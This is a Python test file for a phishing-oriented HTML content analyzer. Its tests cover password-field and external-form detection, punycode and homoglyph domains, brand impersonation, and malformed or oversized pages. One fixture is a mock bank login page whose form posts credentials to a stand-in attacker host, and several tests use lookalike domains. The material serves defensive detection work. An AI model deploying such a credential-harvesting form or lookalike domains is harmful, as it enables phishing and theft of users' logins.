"""Tests for Module 3 — passive HTML content analyzer."""

from backend.app.analyzers.content_analyzer.analyzer import (
    analyze_brand_impersonation,
    analyze_content,
)

LOGIN_PAGE_HTML = b"""
<html lang="en"><head><title>Sign in - MyBank Secure</title>
<meta name="description" content="Login to your account"></head>
<body>
<form action="https://collector.evil-cdn.net/submit" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
<a href="https://partner-site.org/x">external</a>
<a href="/internal">internal</a>
<iframe src="https://ads.tracker.io/frame"></iframe>
</body></html>
"""

NORMAL_PAGE_HTML = b"""
<html lang="en"><head><title>Example Domain</title></head>
<body><p>This domain is for use in illustrative examples.</p>
<a href="https://www.iana.org/domains/example">More information</a></body></html>
"""

MALFORMED_HTML = b"<html><head><title>Broken <b>page</title></head><body><div><p>oops"


def test_normal_website_basic_extraction():
    result, findings = analyze_content("https://example.com/", NORMAL_PAGE_HTML, "example.com")
    assert result["status"] == "COMPLETED"
    assert result["page_title"] == "Example Domain"
    assert result["forms"]["total"] == 0
    assert result["links"]["internal"] >= 0
    assert result["brand_analysis"]["possible_impersonation"] is False


def test_login_form_and_password_field_detected():
    result, findings = analyze_content(
        "https://mybank.example.com/", LOGIN_PAGE_HTML, "mybank.example.com"
    )
    assert result["forms"]["total"] == 1
    assert result["forms"]["password_fields"] == 1
    assert any(f.id == "CONTENT_PASSWORD_INPUT" for f in findings)


def test_suspicious_external_form_action():
    result, findings = analyze_content(
        "https://mybank.example.com/", LOGIN_PAGE_HTML, "mybank.example.com"
    )
    assert result["forms"]["external_form_actions"], "external action must be captured"
    assert any(f.id == "CONTENT_EXTERNAL_FORM_ACTION" for f in findings)


def test_external_links_counted():
    result, _ = analyze_content("https://example.com/", LOGIN_PAGE_HTML, "example.com")
    # partner-site.org + ads.tracker.io iframe are external; /internal is internal
    assert result["links"]["external"] >= 1
    assert result["links"]["internal"] >= 1


def test_punycode_hostname_flagged():
    html = b"<html><head><title>PayPal</title></head><body></body></html>"
    result, findings = analyze_content("https://xn--pple-43d.com/", html, "xn--pple-43d.com")
    assert any(f.id == "CONTENT_PUNYCODE_HOST" for f in findings)


def test_brand_impersonation_indicator():
    html = b"<html><head><title>PayPal - Verify Your Account</title></head><body></body></html>"
    _, findings = analyze_content("https://paypa1-secure.net/", html, "paypa1-secure.net")
    assert any(f.id == "CONTENT_BRAND_IMPERSONATION" for f in findings)


def test_brand_homoglyph_detection():
    analysis = analyze_brand_impersonation("goog1e-login.com", "Google Login", "")
    assert analysis["possible_impersonation"] is True


def test_official_brand_domain_not_flagged():
    analysis = analyze_brand_impersonation("accounts.google.com", "Sign in - Google", "")
    official = [m for m in analysis["matches"] if m["type"] == "OFFICIAL_DOMAIN"]
    assert official, "official domain must be recognized"


def test_malformed_html_does_not_crash():
    result, _ = analyze_content("https://example.com/", MALFORMED_HTML, "example.com")
    assert result["status"] == "COMPLETED"


def test_oversized_html_truncated():
    big = (
        b"<html><head><title>Big</title></head><body>"
        + b"a" * (2 * 1024 * 1024)
        + b"</body></html>"
    )
    result, findings = analyze_content("https://example.com/", big, "example.com")
    assert any(f.id == "CONTENT_TRUNCATED" for f in findings)
